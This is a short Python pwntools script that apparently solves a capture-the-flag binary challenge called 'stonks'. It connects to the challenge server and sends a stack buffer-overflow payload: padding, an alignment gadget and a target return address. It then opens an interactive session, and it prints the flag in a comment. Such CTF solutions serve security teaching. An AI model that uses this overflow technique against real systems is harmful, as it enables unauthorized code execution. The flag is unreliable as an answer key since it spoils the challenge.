#!/usr/bin/env python3
#flag{to_the_moon}
#python3 solution.py

from pwn import *

target_address = 0x401258
stack_align = 0x401257

p = remote("stonks.hsc.tf", 1337)
#p = process("./chal")
#raw_input("attach gdb")

p.recvuntil("Please enter the stock ticker symbol:")

#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("faaaaaaa", n=8)
payload = pad + p64(stack_align) + p64(target_address)

print(payload)
p.sendline(payload)
p.interactive()

